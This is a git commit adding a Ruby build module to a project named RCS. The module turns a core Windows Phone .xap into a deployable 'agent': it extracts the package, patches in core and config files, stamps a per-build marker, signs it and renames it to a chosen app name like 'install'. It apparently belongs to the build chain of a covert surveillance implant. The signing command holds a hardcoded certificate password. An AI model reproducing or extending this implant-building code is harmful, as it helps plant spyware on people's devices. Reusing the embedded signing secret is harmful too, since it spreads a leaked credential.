036ecae05ad9b82fdb965d2a6e47fc730b18f267
alor <alberto.ornaghi@gmail.com>
2013-07-31 16:58:08 +0200

    build for windows phone

---
+++ lib/rcs-db/build/winphone.rb
@@ -0,0 +1,112 @@
+#
+#  Agent creation for winMo
+#
+
+# from RCS::Common
+require 'rcs-common/trace'
+require 'pry'
+
+module RCS
+module DB
+
+class BuildWinPhone < Build
+
+  def initialize
+    super
+    @platform = 'winphone'
+  end
+
+  def unpack
+    super
+
+    trace :debug, "Build: xap extract"
+
+    Zip::ZipFile.open(path('core.xap')) do |z|
+      z.each do |f|
+        f_path = path('xap/' + f.name)
+        FileUtils.mkdir_p(File.dirname(f_path))
+        z.extract(f, f_path) unless File.exist?(f_path)
+      end
+    end
+  end
+
+  def patch(params)
+
+    trace :debug, "Build: patching: #{params}"
+
+    # add the file to be patched to the params
+    # these params will be passed to the super
+    params[:core] = 'xap/DeviceInfo.dat'
+    params[:config] = 'xap/cptm511.dql'
+
+    # enforce demo flag accordingly to the license
+    # or raise if cannot build
+    params['demo'] = LicenseManager.instance.can_build_platform :winmo, params['demo']
+
+    # invoke the generic patch method with the new params
+    super
+
+    # replace the two files inside the xap
+    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{path(params[:core])}"
+    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{path(params[:config])}"
+  end
+
+  def melt(params)
+    trace :debug, "Build: melting: #{params}"
+
+    @appname = params['appname'] || 'install'
+
+    # sign the xap
+    CrossPlatform.exec path('XapSignTool'), "sign /P 6troppoHT /f #{path("winphone.pfx")} #{path('core.xap')}"
+
+    FileUtils.mv path('core.xap'), path(@appname + '.xap')
+    FileUtils.mv path('winphone.aetx'), path(@appname + '.aetx')
+
+    @outputs = [@appname + '.xap', @appname + '.aetx']
+  end
+
+  def pack(params)
+    trace :debug, "Build: pack: #{params}"
+
+    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      @outputs.each do |output|
+        if File.file?(path(output))
+          z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
+        end
+      end
+    end
+
+    # this is the only file we need to output after this point
+    @outputs = ['output.zip']
+  end
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      z.each do |f|
+        f_path = path(f.name)
+        FileUtils.mkdir_p(File.dirname(f_path))
+
+        # skip empty dirs
+        next if File.directory?(f.name)
+
+        z.extract(f, f_path) unless File.exist?(f_path)
+      end
+    end
+
+    Zip::ZipFile.open(path('core.xap')) do |z|
+      core_content = z.file.open('DeviceInfo.dat', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('DeviceInfo.dat'), "wb") {|f| f.write core_content}
+    end
+
+    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
+    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{Config.instance.temp('DeviceInfo.dat')}"
+    FileUtils.rm_rf Config.instance.temp('DeviceInfo.dat')
+
+    CrossPlatform.exec "zip", "-j -u #{core} #{path('core.xap')}"
+  end
+
+end
+
+end #DB::
+end #RCS::
